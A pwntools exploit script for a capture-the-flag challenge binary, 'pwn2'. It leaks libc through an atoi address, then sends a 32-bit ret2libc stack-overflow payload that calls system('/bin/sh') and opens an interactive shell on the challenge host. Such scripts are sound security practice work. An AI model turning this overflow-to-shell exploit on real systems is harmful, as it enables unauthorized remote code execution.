#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./pwn2')

host = args.HOST or 'pwn2.ctf.fifthdoma.in'
port = int(args.PORT or 9002)

if not args.REMOTE:
    libc = exe.libc
else:
    libc = ELF("./libc.so.6")

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
p.recvline()
leak = int(p.recvline().strip().split()[-1],16)
log.info(f"atoi leak @ {hex(leak)}")
if not args.REMOTE:
    libc.address = leak - 0x0370c0
else:
    libc.address = leak - 0x036620

log.info(f"libc base @ {hex(libc.address)}")

#overflow offset at 81

payload = b"A"*80
payload += b"B" * 4 #ebp pad
payload += p32(libc.symbols['system'])
payload += p32(libc.symbols['exit'])
payload += p32(libc.search(b"/bin/sh").__next__())
p.sendline(payload)

p.interactive()

